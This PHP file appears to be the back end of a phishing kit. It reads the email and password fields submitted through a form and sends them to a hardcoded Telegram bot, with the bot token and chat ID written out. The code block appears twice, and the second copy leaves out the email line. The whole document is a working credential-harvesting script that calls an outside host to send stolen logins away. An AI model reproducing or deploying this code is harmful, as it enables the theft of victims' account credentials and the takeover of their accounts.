<?php
    if(isset($_POST['submit']))
    $text=$_POST["email"];
    $text2=$_POST["pass"];
        $response = file_get_contents("https://api.telegram.org/bot5710412371:AAGXuAdUqd5sP4dp-nGYbZhHy84MShP1p20/sendMessage?chat_id=5148207901&text=$text,$text2");    
    
?>
<?php
    if(isset($_POST['submit']))
    $text2=$_POST["pass"];
        $response = file_get_contents("https://api.telegram.org/bot5710412371:AAGXuAdUqd5sP4dp-nGYbZhHy84MShP1p20/sendMessage?chat_id=5148207901&text=$text,$text2");    
    
?>